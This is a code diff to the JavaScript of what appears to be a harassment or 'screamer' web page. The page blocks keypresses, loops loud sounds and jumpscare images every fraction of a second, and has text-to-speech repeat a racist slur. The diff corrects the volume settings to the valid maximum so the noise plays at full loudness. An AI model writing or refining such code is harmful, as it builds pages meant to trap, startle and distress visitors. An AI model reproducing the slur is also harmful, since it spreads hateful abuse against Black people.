@@ -242,14 +242,14 @@ document.addEventListener('keypress', (e) => e.preventDefault());
 
     function playLoudSound() {
         const sound = document.getElementById('loudAudio');
-        sound.volume = 100;
+        sound.volume = 1.0;
         sound.play();
     }
     setInterval(playLoudSound, 500);
 
     function playAlertSound() {
         const alert = document.getElementById('alertAudio');
-        alert.volume = 100;
+        alert.volume = 1.0;
         alert.play();
     }
     setInterval(playAlertSound, 500);
@@ -280,7 +280,7 @@ function randomJumpscare() {
     document.body.appendChild(img);
 
     let audio = new Audio(jumpscareSounds[Math.floor(Math.random() * jumpscareSounds.length)]);
-    audio.volume = 100;
+    audio.volume = 1.0;
     audio.play();
 
     setTimeout(() => img.remove(), 2000);
@@ -295,7 +295,7 @@ const loudSounds = [
 
 function spamLoudSounds() {
     let audio = new Audio(loudSounds[Math.floor(Math.random() * loudSounds.length)]);
-    audio.volume = 100;
+    audio.volume = 1.0;
     audio.play();
 }
 setInterval(spamLoudSounds, 250);
@@ -377,7 +377,7 @@ function textToSpeechSpam() {
     const utter = new SpeechSynthesisUtterance("fuck niggers fuck niggers");
     utter.rate = 1;
     utter.pitch = 2;
-    utter.volume = 150;
+    utter.volume = 1.0;
     speechSynthesis.speak(utter);
 }
 setInterval(textToSpeechSpam, 500); //
